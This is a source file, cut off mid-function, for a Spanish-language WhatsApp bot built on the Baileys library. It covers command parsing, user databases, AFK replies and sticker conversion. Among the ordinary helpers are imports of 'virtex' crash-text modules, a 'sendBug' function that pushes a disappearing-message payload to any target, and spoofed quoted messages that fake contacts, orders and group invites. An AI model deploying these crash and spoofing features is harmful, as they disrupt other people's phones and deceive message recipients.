const
	{
	    WAConnection: _WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WAMessageProto,
		ReconnectMode,
		ProxyAgent,
		ChatModification,
		GroupSettingChange,
		WA_MESSAGE_STUB_TYPES,
		WA_DEAFULT_EPHEMERAL,
		waChatKey,
		mentionedJid,
		processTime,
		prepareMessageFromContent, 
		relayWAMessage
	} = require("@adiwajshing/baileys")
const simple = require('./lib/simple.js')
const WAConnection = simple.WAConnection(_WAConnection)
const qrcode = require('qrcode-terminal')
const qrkode = require("qrcode")
const imageToBase64 = require('image-to-base64')
const moment = require("moment-timezone")
const fs = require("fs")
const axios = require("axios")
const ffmpeg = require('fluent-ffmpeg')
const request = require('request')
const util = require('util')
const { y2mateA, y2mateV } = require('./lib/y2mate')
const base64Img = require('base64-img')
const ms = require('parse-ms')
const figlet = require('figlet')
const ytsd = require('ytsr')
const cheerio = require('cheerio')
const yts = require( 'yt-search')
const fromData = require('form-data')
const os = require('os')
const ggs = require('google-it')
const googleImage = require('g-i-s')
const toMs = require('ms')
const fetch = require('node-fetch')
const imgbb = require('imgbb-uploader')
const Math_js = require('mathjs')
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const speed = require('performance-now')
const hx = require('hxz-api')
const xa = require('xfarr-api')
const { color, bgcolor } = require('./lib/color')
const { exec } = require('child_process')
const { fetchJson } = require('./lib/fetcher')
const { uploadimg, upload } = require('./lib/uploadimg')
const { webp2mp4File } = require('./lib/webp2mp4')
const { lirikLagu } = require('./lib/lirik.js')
const { wikiSearch } = require('./lib/wiki.js')
const { herolist } = require('./lib/herolist.js')
const { herodetails } = require('./lib/herodetail.js')
const { mediafireDl } = require('./lib/mediafire.js')
const { virtex } = require('./virtex/virtex')
const { virtex2 } = require('./virtex/virtex2')
const { virtex3 } = require('./virtex/virtex3')
const { virtex4 } = require('./virtex/virtex4')
const { virtex5 } = require('./virtex/virtex5')
const { virtex6 } = require('./virtex/virtex6')
const { virtex7 } = require('./virtex/virtex7')
const { virtex8 } = require('./virtex/virtex8')
const { virtex9 } = require('./virtex/virtex9')
const { ngazap } = require('./virtex/ngazap')
const { virtag } = require('./virtex/virtag')
const { emoji2 } = require('./virtex/emoji2')
const { pinterest } = require('./lib/pinterest')
const { addCommands, checkCommands, deleteCommands } = require('./lib/autoresp')
const { yta, ytv, buffer2Stream, ytsr, baseURI, stream2Buffer, noop } = require('./lib/ytdl')
const { getBuffer, getGroupAdmins, getRandom, start, info, success, close } = require('./lib/functions')
const client = new WAConnection()

// STICKER WM
//const exect = require('await-exec')
//const webp = require('webp-converter')
//const sharp = require('sharp')
const Exif = require('./lib/exif')
const exif = new Exif()

// DATABASE
const afk = JSON.parse(fs.readFileSync('./database/afk.json'))
const setik = JSON.parse(fs.readFileSync('./database/setik.json'))
const vien = JSON.parse(fs.readFileSync('./database/vien.json'))
const imagi = JSON.parse(fs.readFileSync('./database/imagi.json'))
const bad = JSON.parse(fs.readFileSync('./database/bad.json'))
const commandsDB = JSON.parse(fs.readFileSync('./database/commands.json'))
const tictactoe = JSON.parse(fs.readFileSync("./database/tictactoe.json"))
const antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
const nsfww = JSON.parse(fs.readFileSync('./database/nsfww.json'))
const _registered = JSON.parse(fs.readFileSync('./database/bot/registered.json'))
const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))
const _reminder = JSON.parse(fs.readFileSync("./database/reminder.json"));
const reminder = require("./lib/reminder");
const mute = JSON.parse(fs.readFileSync('./database/mute.json'))
const settings = JSON.parse(fs.readFileSync('./settings.json'))
const kickarea = JSON.parse(fs.readFileSync('./database/kickarea.json'))
const scommand = JSON.parse(fs.readFileSync('./database/scommand.json'))
const autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'))
virgam = fs.readFileSync(`./media/virgam.jpeg`)
const gp = JSON.parse(fs.readFileSync('./database/json/grupo.json'))
const { menu } = require('./src/menu')
const prem = JSON.parse(fs.readFileSync('./database/json/premium.json'));
const user2 = JSON.parse(fs.readFileSync('./database/json/user2.json'))
const ban = JSON.parse(fs.readFileSync('./database/json/banned.json'))
const { ind } = require('./language')
const _leveling = JSON.parse(fs.readFileSync('./database/group/leveling.json'))
const _level = JSON.parse(fs.readFileSync('./database/user/level.json'))
const event = JSON.parse(fs.readFileSync('./database/bot/event.json'))

const _limit = JSON.parse(fs.readFileSync('./database/user/limit.json'))
const uang = JSON.parse(fs.readFileSync('./database/user/uang.json'))
const settingan = JSON.parse(fs.readFileSync('./admin/set.json'))

const {
  dellprem
 } = require('./lib/leveling.js')


ky_ttt = []
tttawal= ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
cmhit = []
autorespon = true 
music = false
baterai = {
battery: "" || "No detectado",
isCharge: "" || false
}
offline = false
publik = true
waktuafk = 'Nada'
alasanafk = 'Nada'
NombreBot = settings.NombreBot
NumeroOwner = settings.NumeroOwner
NombreOwner = settings.NombreOwner
multi = true
emergencia = false


const {
	getLevelingXp,
	getLevelingLevel,
	getLevelingId,
	addLevelingXp,
	addLevelingLevel,
	addLevelingId
} = require('./lib/level.js')


const {
	getRegisteredRandomId,
	addRegisteredUser,    
	createSerial,
	checkRegisteredUser,
    bannadd,
    checkban
    
} = require('./lib/register.js')

               const addRegisteredUser2 = (userid, sender) => {
            const obj = { id: userid, name: sender }
            user2.push(sender)		
            fs.writeFileSync('./database/json/user2.json', JSON.stringify(_registered))
        } 			           
/*[-> ATM & Limit <-]*/
const {
	addATM,
	addKoinUser,
	checkATMuser,
	bayarLimit,
	confirmATM,
	addwaifu,
	limitAdd
} = require('./lib/limitatm.js')




const hr = moment().tz('America/Lima').format("HH:mm:ss")

const time = moment().tz('America/Lima').format("HH:mm")
function kyun(seconds) {
	function pad(s) {
		return (s < 10 ? '0' : '') + s;
	}
	var hours = Math.floor(seconds / (60 * 60));
	var minutes = Math.floor(seconds % (60 * 60) / 60);
	var seconds = Math.floor(seconds % 60);

	//return pad(hours) + ':' + pad(minutes) + ':' + pad(seconds)
	return `${pad(hours)}Horas ${pad(minutes)}Minutos ${pad(seconds)}Segundos`
}
const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}
function waktu(seconds) {
	seconds = Number(seconds);
	var d = Math.floor(seconds / (3600 * 24));
	var h = Math.floor(seconds % (3600 * 24) / 3600);
	var m = Math.floor(seconds % 3600 / 60);
	var s = Math.floor(seconds % 60);
	var dDis = d > 0 ? d + (d == 1 ? " day, " : " days, ") : "";
	var hDis = h > 0 ? h + (h == 1 ? " hour, " : " hours, ") : "";
	var mDis = m > 0 ? m + (m == 1 ? " minute, " : " minutes, ") : "";
	var sDis = s > 0 ? s + (s == 1 ? " second" : " seconds") : "";
	return dDis + hDis + mDis + sDis;
}
const addafk = (from) => {
    const obj = { id: from, expired: Date.now() + toMs('10m') }
    afk.push(obj)
    fs.writeFileSync('./database/afk.json', JSON.stringify(afk))
}
const cekafk = (_dir) => {
    setInterval(() => {
        let position = null
        Object.keys(_dir).forEach((i) => {
            if (Date.now() >= _dir[i].expired) {
                position = i
            }
        })
        if (position !== null) {
            _dir.splice(position, 1)
            fs.writeFileSync('./database/afk.json', JSON.stringify(_dir))
        }
    }, 1000)
}
const isAfk = (idi) => {
    let status = false
    Object.keys(afk).forEach((i) => {
        if (afk[i].id === idi) {
            status = true
        }
    })
    return status
}
const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    scommand.push(obj)
    fs.writeFileSync('./database/scommand.json', JSON.stringify(scommand))
}

const getCommandPosition = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}

const getCmd = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return scommand[position].chats
    }
}

module.exports = cnf = async (cnf, mek) => {
try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
	    if (!mek.message) return
        if (mek.key && mek.key.remoteJid == 'status@broadcast') return
        mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
		const typei = Object.keys(mek.message)[0]
		global.prefix
		me = cnf.user
		m = simple.smsg(cnf, mek)
		const antibot = m.isBaileys
		const isBaileys = m.isBaileys
		const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const type = Object.keys(mek.message)[0]
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio } = MessageType
		const fecha = moment.tz('America/Lima').format('DD/MM')
		const time = moment.tz('America/Lima').format('HH:mm')
		const timeWib = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		const timeWita = moment().tz('Asia/Makassar').format('DD/MM HH:mm:ss')
        const timeWit = moment().tz('Asia/Jayapura').format('DD/MM HH:mm:ss')
		const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
		cnf.on("CB:action,,battery", json => {
	    const battery = json[2][0][1].value
	    const persenbat = parseInt(battery)
	    baterai.battery = `${persenbat}%`
	    baterai.isCharge = json[2][0][1].live
	    })
	    		var prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα¦|/\\©^]/.test(cmd) ? cmd.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'


        isStc = Object.keys(mek.message)[0] == "stickerMessage" ? mek.message.stickerMessage.fileSha256.toString('hex') : ""
	    isStc = `${isStc}`
        const isStcQ = isStc !== "" && content.includes("extendedTextMessage") ||
        isStc !== "" && content.includes("conversation")
        const body = (type === 'listResponseMessage' && mek.message.listResponseMessage.title) ? mek.message.listResponseMessage.title : (type === 'buttonsResponseMessage' && mek.message.buttonsResponseMessage.selectedButtonId) ? mek.message.buttonsResponseMessage.selectedButtonId : (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : ""
		const budo = (typei === 'conversation') ? mek.message.conversation : (typei === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)

		const arg = budy.slice(command.length + 2, budy.length)
		const c = args.join(' ')
		var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
		const messagesD = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
		const dfrply = fs.readFileSync('./alcatraz.jpg')
		cmhit.push(command)
        mess = {
			wait: 'Por favor espere',
			success: 'Listo',
			banned: 'Lo siento ya no puedes utilizarme por ordenes de mi creador',
			error: {
				stick: 'No se puede acceder a los videos!',
				Iv: 'Link invalido!',
                api: 'Error :v'
			},
			only: {
				group: 'Solo se puede utilizar en grupos!',
				ownerG: 'Solo un admin oh el creador de el grupo puede utilizar este comando!',
				ownerB: 'Solo mi Creador puede utilizar este comando',
				admin: 'Solo un administrador puede utilizar este comando',
				Badmin: 'Primero debo ser administrador -_-*'
			}
		}
		const botNumber = cnf.user.jid
		const ownerNumberr = [`${NumeroOwner}@s.whatsapp.net`]
		const isGroup = from.endsWith('@g.us')
					const tescuk = ["0@s.whatsapp.net"]
		const sender = mek.key.fromMe ? cnf.user.jid : isGroup ? mek.participant : mek.key.remoteJid
		const senderNumber = sender.split("@")[0] 
		const conts = mek.key.fromMe ? cnf.user.jid : cnf.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = mek.key.fromMe ? cnf.user.name : conts.notify || conts.vname || conts.name || '-'
		const totalchat = await cnf.chats.all()
		const groupMetadata = isGroup ? await cnf.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const isNsfw = isGroup ? nsfww.includes(from) : false
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const isOwner = ownerNumberr.includes(sender)
		const isGroupAdmins = groupAdmins.includes(sender) || false
		const isKickArea = isGroup ? kickarea.includes(from) : false
		const isAntiLink = isGroup ? antilink.includes(from) : false
		const isWelkom = isGroup ? welkom.includes(from) : false
		const isAuto = isGroup ? autosticker.includes(from) : false
		const isMuted = isGroup ? mute.includes(from) : false
	 	const isEventon = isGroup ? event.includes(from) : false
            const isRegistered = checkRegisteredUser(sender)
            			const isBanned = ban.includes(sender)
            const isLevelingOn = isGroup ? _leveling.includes(from) : false						
		    const isUser2 = user2.includes(sender)

		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isUrl = (url) => {
		return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
		}
		if (antibot === true) return
		const katalog = (teks) => {
             res = cnf.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 321, "message": teks, "footerText": "*ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄*", "thumbnail": ofrply, "surface": 'CATALOG' }}, {quoted:ftrol})
             cnf.relayWAMessage(res)
        }
        const grupinv = (teks) => {
        	grup = cnf.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '60128225553-1407930923@g.us', "inviteCode": 'https://chat.whatsapp.com/CMn8zNddsIyAALctqol6V0', "groupName": `${NombreBot}`, "footerText": "*ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄*", "jpegThumbnail": ofrply, "caption": teks}}, {quoted:finv})
            cnf.relayWAMessage(grup)
        }
		idttt = []
	    ers1 = []
	    ers2 = []
	    gilir = []
	    for (let t of ky_ttt){
	    idttt.push(t.id)
	    ers1.push(t.er1)
	    ers2.push(t.er2)
	    gilir.push(t.gilir)
	    }
	    const isTTT = isGroup ? idttt.includes(from) : false
	    iser1 = isGroup ? ers1.includes(sender) : false
        iser2 = isGroup ? ers2.includes(sender) : false
		try {
		pporang = await cnf.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
		      } catch {
		pporang = 'https://i.ibb.co/Jpkgh86/IMG-20220306-WA0002.jpg'
		      }
		const ofrply = await getBuffer(pporang)
		const thubb = fs.readFileSync('./thub_1.jpg')
		const sekarang = new Date().getTime();
 
			var ase = new Date();
                        var jamss = ase.getHours();
                         switch(jamss){
                case 0: jamss = "Media noche"; break;
                case 1: jamss = "Media noche"; break;
                case 2: jamss = "Media noche"; break;
                case 3: jamss = "Media noche"; break;
                case 4: jamss = "Media noche"; break;
                case 5: jamss = "Amanecer"; break;
                case 6: jamss = "Mañana"; break;
                case 7: jamss = "Mañana"; break;
                case 8: jamss = "Mañana"; break;
                case 9: jamss = "Mañana"; break;
                case 10: jamss = "Mañana"; break;
                case 11: jamss = "Tarde"; break;
                case 12: jamss = "medio día"; break;
                case 13: jamss = "Tarde"; break;
                case 14: jamss = "Tarde"; break;
                case 15: jamss = "Tarde"; break;
                case 16: jamss = "Tarde"; break;
                case 17: jamss = "Noche"; break;
                case 18: jamss = "Noche"; break;
                case 19: jamss = "Noche"; break;
                case 20: jamss = "Noche"; break;
                case 21: jamss = "Noche"; break;
                case 22: jamss = "Media Noche"; break;
                case 23: jamss = "Media Noche"; break;
            }
            var tampilUcapan = "" + jamss;
            const jmn = moment.tz('Asia/Jakarta').format('HH:mm:ss')
				let d = new Date
				let locale = 'es'
				let gmt = new Date(0).getTime() - new Date('1 enero 2021').getTime()
				const weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
				const week = d.toLocaleDateString(locale, { weekday: 'long' })
				const calender = d.toLocaleDateString(locale, {
				day: 'numeric',
				month: 'numeric',
				year: 'numeric'
		       })
		       
  const isPremium= prem.includes(sender)	 
if (groupAdmins) {
prema = 'Admin🤓'
}
if(isPremium) {
prema = 'VIP🤑'
} else {
prema = 'Zzz'
}
if (isOwner) {
prema = `Mi Owner🕴🏽`
}

		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `By Team-Papitas-Fritas`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;By Team-Papitas-Fritas,;;;\nFN:By Team-Papitas-Fritas,\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': ofrply, thumbnail: ofrply,sendEphemeral: true}}}

const ftok = {
key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})
		},
		message: {
			"productMessage": {
				"product": {
					"productImage":{
						"mimetype": "image/jpeg",
						"jpegThumbnail": dfrply 
					},
					"title": `${tampilUcapan}`, 
					"description": `${tampilUcapan}`, 
					"currencyCode": "USD",
					"priceAmount1000": "2000",
					"retailerId": `${tampilUcapan}`,
					"productImageCount": 1
				},
				    "businessOwnerJid": `0@s.whatsapp.net`
		}
	}
}
// TROLI
const ftrol = {
	key : {
                          participant : '0@s.whatsapp.net'
                        },
       message: {
                    orderMessage: {
                            itemCount : 123,
                            status: 1,
                            surface : 1,
                            message: `${tampilUcapan}`, 
                            orderTitle: `${tampilUcapan}`,
                            thumbnail: dfrply, 
                            sellerJid: '0@s.whatsapp.net' 
                          }
                        }
                      }
// LOCALIZACION
const floc = {
	key : {
           participant : '0@s.whatsapp.net'
                        },
       message: {
                    liveLocationMessage: {
                    caption: `${tampilUcapan}`,
                    jpegThumbnail: dfrply
                          }
                        }
                      }
// DOCUMENTO
const fdoc = {
	key : {
           participant : '0@s.whatsapp.net'
                        },
       message: {
                    documentMessage: {
                    title: `${tampilUcapan}`, 
                    jpegThumbnail: dfrply
                          }
                        }
                      }
// VIDEO
const fvid = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
                 "videoMessage": { 
                 "title": `${tampilUcapan}`,
                 "h": `${tampilUcapan}`,
                 'duration': '99999', 
                 'caption': `${tampilUcapan}`,
                 'jpegThumbnail': dfrply
                        }
                       }
	                  }
// INVITACION
const finv = {
	"key": {
		"fromMe": false,
		"participant": "0@s.whatsapp.net",
		"remoteJid": "0@s.whatsapp.net"
	},
	"message": {
		"groupInviteMessage": {
			"groupJid": "60128225553-1407930923@g.us",
			"inviteCode": `${tampilUcapan}`,
			"groupName": `${tampilUcapan}`, 
            "caption": `${tampilUcapan}`, 
            'jpegThumbnail': dfrply
		}
	}
}
// STICKER
const fstick = {
"key": {
	  "participant": `0@s.whatsapp.net`,
      "remoteJid": "6289643739077-1613049930@g.us",
      "fromMe": false,
      "id": "3B64558B07848BD81108C1D14712018E"
    },
    "message": {
      "stickerMessage": {
        "fileSha256": "uZiOJzqOvrOo2WGjnMKgX2MMQMyasT+ZDgqUczpIBmY=",
		"pngThumbnail": dfrply,
	 "mimetype": "image/webp",
        "height": 64,
        "width": 64,
        "directPath": "/v/t62.15575-24/56110107_763365384384977_5720135628188301198_n.enc?oh=450f8f684b06f0ba2dbc9779e5f06774&oe=605B81EE",
        "fileLength": "60206",
        "firstFrameLength": 3626,
        "isAnimated": false
      }
    },
    "messageTimestamp": "1614070775",
    "status": "PENDIENTE"
  }
// GIF
const fgi = {
	 key: { 
         fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
                 "videoMessage": { 
                 "title": `${tampilUcapan}`,
                 "h": `${tampilUcapan}`,
                 'duration': '99999', 
                 'gifback': 'true', 
                 'caption': `${tampilUcapan}`,
                 'jpegThumbnail': dfrply
                        }
                       }
	                  } 
// TEXTO Y IMAGEN
const ftex = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
		"extendedTextMessage": {
                 "text": `${tampilUcapan}`,
                 "title": `${tampilUcapan}`,
                 'jpegThumbnail': dfrply
                        }
	                  } 
                     }
// VN
const fvoc = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
		"audioMessage": {
                 "mimetype":"audio/ogg; codecs=opus",
                 "seconds": "99999",
                 "ptt": "true"
                        }
	                  } 
                     }
const sendBug = async (target) => {
      await cnf.relayWAMessage(
        cnf.prepareMessageFromContent(
          target,
          cnf.prepareDisappearingMessageSettingContent(0),
          {}
        ),{ waitForAck: true }) 
    }
//Boton en texto
const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1
}
cnf.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
}
///Boton en imagen
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await cnf.prepareMessage(from, kma, image)
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 4
}
cnf.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Boton en Video
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await cnf.prepareMessage(from, kma, video)
const buttonMessages = {
videoMessage: mhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
cnf.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Boton en localización
const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await cnf.prepareMessage(from, kma, location)
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
cnf.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
 if (!mek.key.remoteJid.endsWith('@g.us') && offline){
			if (!mek.key.fromMe){
            if (isAfk(mek.key.remoteJid)) return
            addafk(mek.key.remoteJid)
			heheh = ms(Date.now() - waktuafk)
		  sendButMessage(from, `Hola ${pushname}, Lo siento, parece que en este momento esta Offline\n\n*Razón :* ${alasanafk}\n*Fecha :* ${heheh.hours} Horas, ${heheh.minutes} Minutos, ${heheh.seconds} Segundos\n\nPóngase en contacto de nuevo después cuando este Online`, "*ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄*", [{buttonId: 'simi', buttonText: {disText: 'Esta bien'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
			}
		}
		if (mek.key.remoteJid.endsWith('@g.us') && offline) {
			if (!mek.key.fromMe){
				if (mek.message.extendedTextMessage != undefined){
					if (mek.message.extendedTextMessage.contextInfo != undefined){
						if (mek.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
				for (let ment of mek.message.extendedTextMessage.contextInfo.mentionedJid) {
					if (ment === cnf.user.jid){
                        if (isAfk(mek.key.remoteJid)) return
                        addafk(mek.key.remoteJid)
						heheh = ms(Date.now() - waktuafk)
			       sendButMessage(from, `Hola ${pushname}, Lo siento, parece que en este momento esta Offline\n\n*Razon :* ${alasanafk}\n*Fecha :* ${heheh.hours} Horas, ${heheh.minutes} Minutos, ${heheh.seconds} Segundos\n\nPóngase en contacto de nuevo cuando este Online`, "*ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄*", [{buttonId: 'simi', buttonText: {disText: 'Esta bien'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
					}
				}
						}
					}
				}
			}
		}
		const sendStickerUrl = async(to, url) => {
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Descargando sticker'))
				var names = getRandom('.webp')
				var namea = getRandom('.png')
				var download = function (uri, filename, callback) {
					request.head(uri, function (err, res, body) {
						request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
					});
				};
				download(url, namea, async function () {
					let filess = namea
					let asw = names
					require('./lib/exif.js')
					exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
					exec(`webpmux -set exif ./temp/data.exif ${asw} -o ${asw}`, async (error) => {
					let media = fs.readFileSync(asw)
					cnf.sendMessage(to, media, sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Sticker enviado con éxito'))
					});
					});
				});
			}
        const sendWebp = async(from, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './temp' + names + '.png', async function () {
                    console.log('selesai');
                    let ajg = './temp' + names + '.png'
                    let palak = './temp' + names + '.webp'
                    exec(`ffmpeg -i ${ajg} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${palak}`, (err) => {
                        let media = fs.readFileSync(palak)
                        cnf.sendMessage(from, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(ajg)
                        fs.unlinkSync(palak)
                    });
                });
            }
            const sendKontak = (from, nomor, nama) => {
	        const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + `ORG:Creador ${NombreBot}\n` + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
	        cnf.sendMessage(from, { disname: nama, vcard: vcard}, MessageType.contact, {quoted:mek, contextInfo: { forwardingScore: 508, isForwarded: true }})
            }
            const hideTagKontak = async function(from, nomor, nama){
	        let vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG: Contacto\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
	        let anu = await cnf.groupMetadata(from)
	        let members = anu.participants
	        let ane = []
	        for (let i of members){
		    ane.push(i.jid)
	        }
	        cnf.sendMessage(from, { disname: nama, vcard: vcard}, MessageType.contact, {contextInfo: {"mentionedJid": ane}})
            }
		const reply = (teks) => {
			cnf.sendMessage(from, teks, text, { quoted: mek })
		}
							    const costum = (pesan, tipe, target, target2) => {
			cnf.sendMessage(from, pesan, tipe, { contextInfo: { forwardingScore: 400, isForwarded: true } , quoted: { key: { fromMe: false, participant: `${target}`, ...(from ? { remoteJid: from } : {}) },message: { conversation: `${target2}` }}})
			}
			const costumimg = ( pesan , tipe, target , caption) => {
